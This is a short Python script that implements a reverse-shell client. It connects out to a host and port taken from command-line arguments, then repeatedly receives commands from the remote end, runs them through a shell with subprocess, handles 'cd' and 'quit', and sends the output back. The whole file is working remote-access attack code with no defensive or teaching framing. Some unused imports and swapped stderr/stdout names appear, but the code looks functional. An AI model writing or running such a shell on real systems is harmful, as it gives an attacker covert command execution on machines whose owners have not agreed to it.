import argparse
import socket
import sys
import ipaddress
import netifaces
import subprocess
import os

parser = argparse.ArgumentParser()
parser.add_argument("-H", "--host", type=str, help="Host to connect to")
parser.add_argument("-p", "--port", type=int, help="Port to connect to")

args = parser.parse_args()
class Client:
    def __init__(self, address: tuple[str, int], buffer: int = 4096):
        self.buffer = buffer
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Initiate a connection
        self.sock.connect(address)
        self.handle()
    
    def run(self, command: str) -> None:
        """
        Run a command with subprocess and return the output
        """
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )

        return process.communicate()

    def send(self, data: str | bytes) -> None:
        """
        Send data to client
        """
        if type(data) is str:
            data = data.encode("utf-8")
        self.sock.sendall(data)

    def receive(self) -> str:
        """
        Receive a b bit stripped string from the client
        """
        return self.sock.recv(self.buffer).strip().decode("utf-8")

    def cwd(self) -> bytes:
        stderr, stdout = self.run("pwd")
        self.send(stderr + stdout)
    
    def handle(self) -> None:
        while True:
            self.cwd()
            command = self.receive()
            if not len(command) > 0:
                continue
            if command[:2] == "cd":
                os.chdir(command[3:])
            if command.lower() == "quit":
                self.sock.close()
                break        
            stderr, stdout = self.run(command)
            self.send(stderr + stdout)

if __name__ == "__main__":
    Client((args.host, args.port))
